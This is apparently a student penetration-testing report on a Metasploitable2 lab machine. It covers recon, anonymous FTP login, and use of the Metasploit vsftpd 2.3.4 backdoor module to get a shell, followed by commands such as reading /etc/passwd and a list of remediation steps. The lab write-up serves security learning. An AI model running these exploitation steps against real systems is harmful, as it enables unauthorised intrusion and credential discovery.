Penetration Testing Report – Metasploitable2 (Port 21 - FTP)

1. Test Date : 12-06-25
    Test by : [ me ]
    
2. Target Information
- Target IP: 192.168.1.101
- Operating System: Linux (Ubuntu-based)
- FTP Server: vsftpd 2.3.4
- Port in Scope: 21/tcp
- Tools Used: Nmap, Netcat, Metasploit, FTP client

3. Reconnaissance

3.1 Nmap Scan
Command:
nmap -sV -p 21 192.168.1.101

Result:
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4

Interpretation:
vsftpd 2.3.4 is a known vulnerable FTP server. This version contains a backdoor that opens a shell on port 6200 when a specially crafted username is submitted.

4. Enumeration

4.1 Banner Grabbing
Command:
nc 192.168.1.101 21

Output:
220 (vsFTPd 2.3.4)

4.2 Anonymous Login Test
Command:
ftp 192.168.1.101

Login:
Username: anonymous
Password: (any)

Result:
- Anonymous login: Successful
- Able to list directories, upload/download files

5. Exploitation

5.1 Exploit: Backdoor Command Execution (CVE-2011-2523)
vsftpd 2.3.4 contains a backdoor triggered by usernames containing `:)`.

5.2 Using Metasploit

Command:
msfconsole

Module:
use exploit/unix/ftp/vsftpd_234_backdoor

Set options:
set RHOST 192.168.1.101
set RPORT 21
run

Result:
[*] Backdoor service has been spawned
[*] Command shell session 1 opened

Shell access obtained as: nobody (limited shell)

6. Post-Exploitation

Commands run:
- whoami → nobody
- uname -a → kernel version
- cat /etc/passwd → found default users
- Checked for privilege escalation paths

Notes:
- Privilege escalation possible via local exploits
- Pivoting to root user achieved via known kernel exploits

7. Recommendations

- Immediately remove or update vsftpd to a secure version
- Disable anonymous FTP login
- Restrict FTP access to trusted IPs only
- Monitor logs for unusual activity
- Replace FTP with secure alternatives (e.g., SFTP)

8. Conclusion

Port 21 (FTP) on 192.168.1.101 was vulnerable due to an outdated and backdoored vsftpd service (v2.3.4). 
Anonymous login was enabled, and full system compromise was achieved via the Metasploit `vsftpd_234_backdoor` exploit. 
This demonstrates a critical security flaw that must be remediated immediately.
